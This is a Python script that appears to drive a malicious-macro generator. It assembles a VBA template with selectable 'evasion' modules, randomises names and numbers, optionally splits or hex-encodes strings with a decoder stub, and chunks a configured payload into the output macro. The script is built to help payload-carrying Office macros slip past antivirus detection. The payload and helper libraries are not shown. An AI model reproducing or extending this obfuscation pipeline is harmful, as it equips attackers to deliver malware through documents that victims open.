from lib.helper import Helper
from lib.encoder import Encoder
import sys

if __name__ == "__main__":  
    helper = Helper(sys.argv)
    helper.ParseConfig().ShowConfigDescription()
    
    encoder = Encoder(helper)
    encoder.append_vars(helper.GetConfig("vars"))
    
    template = helper.LoadFile(helper.GetConfig("template"))
    data = template
    
    for evasion in helper.GetConfig("evasion"):
        data += helper.LoadFile("templates/evasions/" + evasion + ".vba")
 
    data = encoder.replace_var(data, "offset", encoder.get_encoding_offset())
    data = encoder.encode_user_vars(data)
    data = encoder.append_def_use_tag(data)
    data = encoder.rand_vars(data)
    data = encoder.rand_int(data)
    data = encoder.rand_smallint(data)
    
    encodedvars = helper.GetConfig("encodedvars")
    for var in encodedvars:
        data = encoder.replace_var(data, var, encodedvars[var], True)
    
    if "-s" in sys.argv or "--split_strings" in sys.argv:
        data = encoder.split_strings(data)
    if "-x" in sys.argv or "--strings_to_hex" in sys.argv:
        decoder = helper.LoadFile("templates/evasions/hex-decode.vba")
        data = encoder.strings_to_hex(data, decoder)

    data = encoder.chunk_payload(data, helper.GetConfig("payload"))
    
    helper.SaveFile(sys.argv[2], data).ProcessCompleted()
